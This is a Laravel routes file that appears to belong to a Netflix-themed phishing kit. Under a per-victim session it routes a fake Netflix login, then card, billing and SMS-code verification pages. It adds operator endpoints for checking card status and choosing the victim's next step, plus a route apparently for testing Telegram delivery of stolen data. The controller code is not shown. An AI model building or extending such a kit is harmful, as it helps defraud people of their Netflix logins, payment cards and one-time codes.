<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use App\Http\Controllers\MainController;

Route::get('/', [MainController::class, 'createSession'])->name('home');
Route::prefix('{session_id}')->group(function () {
    Route::get('/login', [MainController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [MainController::class, 'netflixLogin'])->name('netflix.login');
    Route::get('/card', [MainController::class, 'showCardForm'])->name('card');
    Route::post('/card', [MainController::class, 'verifyCard'])->name('verifyCard');
    Route::get('/billing', [MainController::class, 'showBillingForm'])->name('billing');
    Route::post('/billing', [MainController::class, 'verifyBilling'])->name('verifyBilling');
    Route::get('/sms', [MainController::class, 'showSmsVerification'])->name('sms');
    Route::post('/sms', [MainController::class, 'verifySms'])->name('verifySms');
    Route::post('/handle-spin', [MainController::class, 'handleSpin'])->name('handleSpin');
});

Route::get('/check-cc-status', [MainController::class, 'checkCcStatus'])->name('checkCcStatus');
Route::get('/what-to-do', [MainController::class, 'whatToDo'])->name('what-to-do');
Route::post('/refresh-action', [MainController::class, 'refreshAction'])->name('refresh.action');
Route::post('/clear-cc-status', function () {
    session()->forget('cc_status');
    return response()->json(['success' => true]);
});

// Test route for Telegram configuration
Route::get('/test-telegram', [MainController::class, 'testTelegram']);



